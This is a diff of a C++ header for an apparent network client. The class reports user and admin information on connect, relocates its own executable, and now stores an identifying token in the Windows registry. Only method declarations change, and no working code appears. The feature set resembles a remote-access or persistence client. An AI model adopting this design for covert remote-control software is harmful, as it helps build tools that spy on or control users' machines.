@@ -26,7 +26,9 @@ Sends the primary information when the client connects.
         string setCurrentDirectory(); // return current directory;
         string setLocationProg(); //set localisation prog after remove according to rights
         void setSock(int sock); //Set socket
-        string setToken(const int token_size);
+        
+        string getTokenOrSetTokenInRegistry();
+        wstring generateToken(const int token_size); //Generate tokken and set in a_token.
 
         //---------------------------------------------------------------------
         //Network:
@@ -41,6 +43,7 @@ Sends the primary information when the client connects.
         bool getIsAdmin();//getter of is_admin
         string getPathProg();// getter see location of prog.
         string getNameUser();
+        string getToken();
         //---------------------------------------------------------------------
         void moveProg(); 
 
